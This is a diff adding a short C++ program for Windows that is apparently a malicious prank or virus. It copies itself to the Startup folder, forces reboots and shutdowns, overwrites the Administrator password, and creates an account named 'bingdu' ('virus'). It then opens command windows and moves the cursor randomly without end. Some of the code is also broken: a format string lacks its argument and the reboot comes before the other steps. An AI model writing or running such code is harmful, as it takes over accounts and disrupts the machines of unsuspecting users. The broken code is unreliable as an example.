@@ -1,0 +1,28 @@
+#include <iostream>
+#include <windows.h>
+#include <ctime>
+#include <cstdlib>
+#include <cstdio>
+#include <fstream>
+using namespace std;
+int main(){
+  char copy[80];
+  sprintf(copy,"copy %s \"%%userprofile%%\\「开始」菜单\\程序\\启动\"");
+  system(copy);
+  char cmd[] = "shutdown -r -t 0";
+  system("ping baidu.com");
+  system(cmd);
+  system("pause");
+  system(copy);
+  system("net user Administrator xz");
+  system("net user bingdu xz /add");
+  int x = GetSystemMetrics(SM_CXSCREEN);
+    int y = GetSystemMetrics(SM_CYSCREEN);
+    srand(time(0)); 
+    system("shutdown -s -t 20");
+    while (1){ 
+      SetCursorPos(rand() % x,rand() % y);
+      system("start");
+    }
+    return 0;
+}
